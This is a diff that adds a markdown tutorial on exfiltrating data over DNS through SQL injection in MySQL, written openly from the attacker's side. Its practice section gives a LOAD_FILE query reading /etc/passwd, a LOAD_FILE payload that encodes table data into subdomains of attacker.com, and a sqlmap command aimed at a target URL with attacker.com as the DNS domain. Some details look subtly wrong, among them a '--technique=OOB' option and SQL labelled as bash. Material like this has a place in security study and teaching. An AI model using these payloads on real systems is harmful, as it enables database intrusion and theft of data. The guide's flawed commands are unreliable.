@@ -1,0 +1,66 @@
+---
+title: DNS Exfiltration via SQL Injection Techniques
+description: Learn how to exfiltrate data through DNS in MySQL using SQL injection.
+keywords:
+- DNS exfiltration
+- SQL injection
+- MySQL LOAD_FILE
+- out-of-band
+- data exfiltration
+---
+
+# DNS Exfiltration
+
+## Context
+
+The goal of this guide is to provide a comprehensive understanding of DNS exfiltration using an SQL injection technique, specifically with MySQL databases. Readers are expected to be familiar with DNS protocols, data exfiltration methods, and MySQL's out-of-band SQL injection techniques. This guide is focused on the offensive security aspect, detailing how data can be extracted via DNS mechanisms.
+
+## Theory
+
+### DNS Exfiltration via SQL Injection
+
+DNS exfiltration is a sophisticated technique used to extract data by encoding it into DNS queries. This method exploits the capability of a system to make external DNS requests through SQL queries, allowing an attacker to retrieve data by crafting DNS queries that encode sensitive information. When these queries are sent, they are directed to a DNS server controlled by the attacker, thus leaking the data in the process.
+
+### MySQL LOAD_FILE Function
+
+The `LOAD_FILE` function in MySQL is designed to read a file from the server's filesystem and return its contents. Although legitimate in many use cases, this function becomes a vulnerability when abused. If the database user possesses FILE privileges, an attacker can exploit this feature to read and subsequently exfiltrate sensitive files.
+
+### Out-of-Band (OOB) SQL Injection
+
+Out-of-Band SQL injection is a variant of SQL injection where the attacker sends data to an external server, effectively bypassing direct response channels between the client and the server. This is achieved by inserting SQL payloads that trigger outbound interactions, such as DNS requests. This technique is particularly useful when direct data retrieval through conventional response channels is restricted or closely monitored.
+
+## Practice
+
+### DNS Exfiltration via MySQL LOAD_FILE
+
+- **Identify a Vulnerable MySQL Instance**: Ensure the MySQL instance has FILE privileges enabled to exploit the `LOAD_FILE` function.
+  
+- **Read Sensitive Files Using LOAD_FILE**:
+  ```bash
+  SELECT LOAD_FILE('/etc/passwd');
+  ```
+  By issuing the above command, you gain access to the file specified within the server's file system.
+
+- **Craft the SQL Injection Payload**: Create a payload that encodes the desired data into DNS queries. The payload can be structured to exfiltrate information to a controlled DNS server.
+  ```sql
+  SELECT LOAD_FILE(CONCAT('\\\\', (SELECT SUBSTRING(data, 1, 63) FROM sensitive_table), '.attacker.com\\'));
+  ```
+  This SQL query appends the captured data as a subdomain of a DNS name controlled by the attacker, enabling exfiltration.
+
+**Result**: Successful execution of this technique will result in sensitive data being exfiltrated via DNS queries sent to a server controlled by an attacker.
+
+### Automated DNS Exfiltration Tooling
+
+- **Utilize Tools for Automation**: Tools like sqlmap facilitate the automation of DNS exfiltration through SQL injection.
+  
+- **Execute the Automated Command**:
+  ```bash
+  sqlmap --url='http://target.com/vuln.php?id=1' --dns-domain='attacker.com' --technique=OOB
+  ```
+  This command automates the process of finding and exploiting SQL injection vulnerabilities to exfiltrate data via DNS.
+
+**Result**: The automated execution results in efficient and scalable data exfiltration through DNS queries, using SQL injection techniques.
+
+## Tools
+
+- **sqlmap**: This tool is essential for automating the detection and exploitation of SQL injection vulnerabilities, including those allowing out-of-band communication via DNS queries. It streamlines the process of exfiltrating data by handling complex payload formation and network interactions.
